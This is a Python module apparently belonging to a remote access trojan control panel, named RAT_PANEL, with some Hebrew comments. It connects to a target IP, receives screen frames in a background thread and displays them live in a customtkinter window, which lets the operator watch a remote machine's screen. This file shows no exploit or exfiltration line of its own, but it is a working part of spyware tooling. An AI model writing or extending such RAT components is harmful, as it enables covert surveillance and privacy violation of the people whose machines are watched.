import threading
import io
from PIL import Image
from customtkinter import CTkImage
from RAT_PANEL.network.screen_socket import ScreenSocket


class ScreenHandler:
    def __init__(self, logic):
        self.logic = logic
        self.ui = logic.ui  # יוגדר לאחר attach_ui
        self.socket = None

        self.running = False
        self.thread = None
        self.stream_visible = True

    def connect(self, ip: str):
        self.socket = ScreenSocket(ip)
        self.socket.connect()
        self.running = True
        self.thread = threading.Thread(target=self._receive_loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.disconnect()
            except Exception:
                pass
            self.socket = None

    def _receive_loop(self):
        try:
            while self.running:
                frame_data = self.socket.receive_frame()
                if not frame_data:
                    break
                if self.stream_visible:
                    self.ui.root.after(0, self._update_image_safe, frame_data)
                else:
                    # אם מוסתר – נוודא שלא מוצגת תמונה
                    self.ui.root.after(0, self.ui.screen_clear_image, "Stream hidden")
        except Exception as e:
            print(f"[SCREEN STREAM ERROR] {e}")
        finally:
            self.ui.root.after(0, self.logic.disconnect_screen)

    def _update_image_safe(self, data: bytes):
        try:
            img = Image.open(io.BytesIO(data))
            ctk_img = CTkImage(light_image=img, dark_image=img, size=(800, 450))
            self.ui.screen_set_image(ctk_img)
        except Exception:
            pass
